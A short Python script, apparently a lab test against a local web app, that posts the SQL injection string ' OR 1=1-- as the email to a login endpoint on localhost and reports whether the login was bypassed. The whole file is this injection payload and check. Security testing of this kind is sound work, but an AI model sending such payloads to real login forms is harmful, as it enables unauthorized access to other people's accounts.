import requests

LOGIN_URL = "http://localhost:3000/rest/user/login"
payload = {"email": "' OR 1=1--", "password": "irrelevant"}

response = requests.post(LOGIN_URL, json=payload)

if response.status_code == 200 and "authentication" in response.text.lower():
    print("[!] Possible SQL Injection vulnerability: Logged in with malicious input.")
else:
    print("[*] SQL Injection unsuccessful or not vulnerable.")
